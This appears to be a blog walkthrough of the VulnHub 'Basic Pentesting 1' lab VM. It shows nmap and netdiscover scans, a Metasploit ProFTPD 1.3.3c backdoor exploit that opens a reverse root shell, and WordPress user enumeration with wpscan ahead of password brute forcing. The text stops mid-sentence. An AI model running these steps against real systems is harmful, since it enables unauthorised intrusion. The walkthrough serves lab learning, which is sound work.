---
layout: posts
title:  "Walkthrought Basic Pentesting"
date:   2020-03-26 23:20:58 +0530
tags: CTF update
---

In this walkthrough we are going to look at various steps of exploiting the end device. The `.ova` file can be downloaded from [www.vulnhub.com](https://www.vulnhub.com/entry/basic-pentesting-1,216/)
## Scanning the network
One of the first steps is to scan the network for open ports and look for vulnerabilities. It can be done using tools/ utilities like `netdiscover` and `nmap`. We will see usage and outcome of both of these tools.
### Using Netdiscover
`eth1` is the interface of the network on which you are listening to the incoming traffic. The interface can be checked by `ifconfig` command.

{% highlight console %}
netdiscover -i eth1 -r 10.10.10.0/24
{% endhighlight %}

![screenshot]({{ '/assets/img/posts/netdiscover.png' | relative_url }})

### Using Nmap

We can also use `nmap` for target discovery. Since we have already made the target discovery using `netdiscover`, we can move
forward to find open ports and the services running on those ports.

The option
{% highlight console %}
-A: Enable OS detection, version detection, script scanning, and traceroute
{% endhighlight %}

{% highlight console %}
nmap -A 10.10.10.104
{% endhighlight %}

![screenshot]({{ '/assets/img/posts/nmap.png' | relative_url }})

## Results of Scanning

In our `nmap` scan results we have found three ports open with three different services running on these ports.
We will try to exploit all these three services one by one to gain a foothold on the target device. Lets start with the easiest.

##  Targeting FTP

From the scan results of `nmap` we have found that ftp version is `ProFTPD 1.3.3c`. We will now kickstart metasploit framework console to find, if we have some exploits for this version of FTP.

{% highlight console %}
msfconsole
{% endhighlight %}

Search the framework for any existing exploits.

{% highlight console %}
msf5 > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   1  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   2  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   6  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution

{% endhighlight %}

Now we have found an exploit with ranking of `excellent`. Lets try that out.

{% highlight console %}
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 10.10.10.103:4444
[*] 10.10.10.104:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo RATOzCBJHKVT6cmO;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "RATOzCBJHKVT6cmO\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.10.103:4444 -> 10.10.10.104:41092) at 2020-03-27 14:17:39 -0400

pwd
/
whoami
root
{% endhighlight %}

## Targeting Website

As a first step we need to enumerate the directories of the website. For this we
will use `DirBuster`. This tool is developed by OWASP Foundation to brute force
directories and files names on web/application servers.
This tool is also available in Kali Linux.

In order to use this tool we need to provide the base path of the website and the
dictionary. We will be using the pre-installed dictionary with Kali Linux.
The path of dictionary list is

`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

The output of the tool shows that there is an existing `/secret` directory which contains the `index.html` page.

Once we land on the home page, we find that it is a wordpress site but the
layout is not properly formatted. It happens because the webpages are not able
to resolve the links. In order to overcome this challenge, we need to make an entry
into the hosts file of our Kali PC.

{% highlight console %}
nano /etc/hosts
10.10.10.104  vtcsec
{% endhighlight %}

There is a beautiful tool `wpscan` for scanning vulnerabilities in wordpress sites
and can be downloaded from [wpscan.org](https://wpscan.org/). The tool comes pre-installed
in Kali Linux.

Now, if can somehow exploit the wordpress site to upload our webshell, we can
get acess to the system. One of the simpliest ways is to find the user accounts
and then try to bruteforce the passwords.

Let us try to enumerate the users

{% highlight console %}
wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0
{% endhighlight %}

`SFQsH.....ayIm1ppfZZ8FH0` is the `api-key` which you get after registering with
[wpvulndb.com](https://wpvulndb.com/)

{% highlight console %}
 Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
{% endhighlight %}

Once we have enumerated the users, we can bruteforce the password. We have downloaded
the wordlist `rockyou-75.txt` from  
